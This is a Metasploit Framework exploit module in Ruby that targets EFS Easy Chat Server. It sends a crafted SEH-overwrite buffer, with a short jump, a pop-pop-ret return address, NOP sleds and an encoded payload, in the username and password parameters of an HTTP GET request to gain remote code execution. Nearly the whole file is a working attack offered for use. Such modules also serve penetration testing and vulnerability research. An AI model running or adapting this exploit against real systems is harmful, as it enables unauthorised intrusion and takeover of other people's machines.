##
# $Id: ca_igateway_debug.rb 6568 2009-05-19 13:20:32Z hdm $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
 
 
class Metasploit3 < Msf::Exploit::Remote
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Seh
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'EFS Easy Chat server Universal BOF-SEH (META)',
            'Description'    => %q{
                This module exploits a vulnerability in Easy chat server by passing
                an arbitary evil biuffer along with the username password.
                Sucessful attack could run arbitary code on victim machine
            },
            'Author'         => 'FB1H2S',
            'License'        => MSF_LICENSE,
            'Version'        => '',
            'References'     =>
                [
                    [ 'Exploitdb', 'http://www.exploit-db.com/exploits/11179' ],
                     
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'seh',
                },
            'Payload'        =>
                {
                    'Space'    => 1200,
                    'BadChars' => "\x00\x0a\x0d\x20",
                    'StackAdjustment' => -3500,
                    'Compat'   =>
                    {
                        'ConnectionType' => '+ws2ord',
                    },
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    [ 'EFS Easy Chat Server Universal', { 'Ret' => 0x1001b9a2 } ], # p/p/r
                ],
            'Privileged'     => true,
            'DisclosureDate' => 'jan 2010',
            'DefaultTarget'  => 0))
 
        register_options(
            [
                Opt::RPORT(80),
            ], self.class)
    end
 
         
 
        def exploit
            connect
            sploit = Rex::Text.rand_text_alphanumeric(216)
                sploit << "\xeb\x06\x90\x90"            # short jump 6 bytes
            sploit << [target.ret].pack('V')      #ppr universal
            sploit << "\x90" * 20                # nop sled
            sploit << payload.encoded            #payload \xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc
            sploit << "\x90" * 20
            request= 'chat.ghp?username=' +sploit+ '&password=' +sploit+ '&room=1&sex=2'
            send = "GET /" + request + " HTTP/1.0"
            sock.put(send + "\r\n\r\n\r\n")
            disconnect
            handler
        end
    end
